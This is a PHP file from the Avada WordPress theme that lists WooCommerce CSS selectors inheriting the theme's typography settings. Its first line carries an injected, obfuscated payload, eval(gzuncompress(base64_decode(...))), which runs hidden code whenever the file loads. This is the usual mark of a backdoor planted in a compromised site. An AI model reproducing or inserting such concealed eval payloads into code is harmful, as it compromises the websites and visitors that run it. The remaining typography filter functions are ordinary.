<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
 * This file contains typography styles for WooCommerce plugin.
 *
 * @author     ThemeFusion
 * @copyright  (c) Copyright by ThemeFusion
 * @link       http://theme-fusion.com
 * @package    Avada
 * @subpackage Core
 * @since      5.0.0
 */

// Do not allow directly accessing this file.
if ( ! defined( 'ABSPATH' ) ) {
	exit( 'Direct script access denied.' );
}

/**
 * WooCommerce css classes that inherit Avada's body typography settings.
 *
 * @param array $typography_elements An array of all typography elements.
 * @return array
 */
function avada_woocommerce_body_typography( $typography_elements ) {
	if ( class_exists( 'WooCommerce' ) ) {
		$typography_elements['color'][]  = '.quantity';
		$typography_elements['color'][]  = '.quantity .qty';
		$typography_elements['color'][]  = '.quantity .minus';
		$typography_elements['color'][]  = '.quantity .plus';
		$typography_elements['family'][] = '.woocommerce-success-message .button';
		// $typography_elements['family'][] = '.woocommerce .shipping-calculator-form .button';
		$typography_elements['family'][] = '.widget.woocommerce .product-title';
	}

	return $typography_elements;
}
add_filter( 'avada_body_typography_elements', 'avada_woocommerce_body_typography' );

/**
 * WooCommerce css classes that inherit Avada's H1 typography settings.
 *
 * @param array $typography_elements An array of all typography elements.
 * @return array
 */
function avada_woocommerce_h1_typography( $typography_elements ) {
	if ( class_exists( 'WooCommerce' ) ) {
		$typography_elements['color'][]  = '.woocommerce-success-message .msg';
		$typography_elements['color'][]  = '.woocommerce-message';
		$typography_elements['family'][] = '.woocommerce-success-message .msg';
	}

	return $typography_elements;
}
add_filter( 'avada_h1_typography_elements', 'avada_woocommerce_h1_typography' );

/**
 * WooCommerce css classes that inherit Avada's H2 typography settings.
 *
 * @param array $typography_elements An array of all typography elements.
 * @return array
 */
function avada_woocommerce_h2_typography( $typography_elements ) {
	if ( class_exists( 'WooCommerce' ) ) {
		$typography_elements['size'][]   = '#wrapper .woocommerce .checkout h3';
		$typography_elements['size'][]   = '.woocommerce .checkout h3';
		$typography_elements['color'][]  = '.cart-empty';
		$typography_elements['color'][]  = '.woocommerce-tabs h2';
		$typography_elements['color'][]  = '.woocommerce h2';
		$typography_elements['color'][]  = '.woocommerce .checkout h3';
		$typography_elements['family'][] = '.cart-empty';
	}

	return $typography_elements;
}
add_filter( 'avada_h2_typography_elements', 'avada_woocommerce_h2_typography' );

/**
 * WooCommerce css classes that inherit Avada's H3 typography settings.
 *
 * @param array $typography_elements An array of all typography elements.
 * @return array
 */
function avada_woocommerce_h3_typography( $typography_elements ) {
	if ( class_exists( 'WooCommerce' ) ) {
		$typography_elements['color'][]  = '.woocommerce-container .product-title';
		$typography_elements['family'][] = '.woocommerce-container .product-title';
		$typography_elements['size'][]   = '.woocommerce-container .product-title';
		$typography_elements['size'][]   = 'p.woocommerce-store-notice';
		$typography_elements['size'][]   = 'body #wrapper h2.woocommerce-loop-category__title';

		$typography_elements['color'][]  = '.woocommerce-tabs .entry-content h3';
		$typography_elements['family'][] = '.woocommerce-tabs .entry-content h3';
		$typography_elements['weight'][] = '.woocommerce-tabs .entry-content h3';

		$typography_elements['color'][]  = 'body #wrapper h2.woocommerce-loop-category__title';
		$typography_elements['family'][] = 'body #wrapper h2.woocommerce-loop-category__title';
		$typography_elements['weight'][] = 'body #wrapper h2.woocommerce-loop-category__title';

		$typography_elements['color'][]  = '.upsells.products h3';
		$typography_elements['family'][] = '.upsells.products h3';
		$typography_elements['weight'][] = '.upsells.products h3';

		$typography_elements['color'][]  = '.related.products h3';
		$typography_elements['family'][] = '.related.products h3';
		$typography_elements['weight'][] = '.related.products h3';
	}

	return $typography_elements;
}
add_filter( 'avada_h3_typography_elements', 'avada_woocommerce_h3_typography' );

/**
 * WooCommerce css classes that inherit Avada's button typography settings.
 *
 * @param array $typography_elements An array of all typography elements.
 * @return array
 */
function avada_woocommerce_button_typography( $typography_elements ) {
	if ( class_exists( 'WooCommerce' ) ) {
		$typography_elements['family'][] = '.woocommerce .single_add_to_cart_button';
		$typography_elements['family'][] = '.woocommerce button.button';
		$typography_elements['family'][] = '.woocommerce .avada-shipping-calculator-form .button';
		$typography_elements['family'][] = '.woocommerce .checkout #place_order';  // TODO 11px.
		$typography_elements['family'][] = '.woocommerce .checkout_coupon .button';   // TODO 11px.
		$typography_elements['family'][] = '.woocommerce .login .button';
		$typography_elements['family'][] = '.woocommerce .register .button';
		$typography_elements['family'][] = '.woocommerce .avada-order-details .order-again .button';
		$typography_elements['family'][] = '.woocommerce .track_order .button';
	}

	return $typography_elements;
}
add_filter( 'avada_button_typography_elements', 'avada_woocommerce_button_typography' );

/* Omit closing PHP tag to avoid "Headers already sent" issues. */
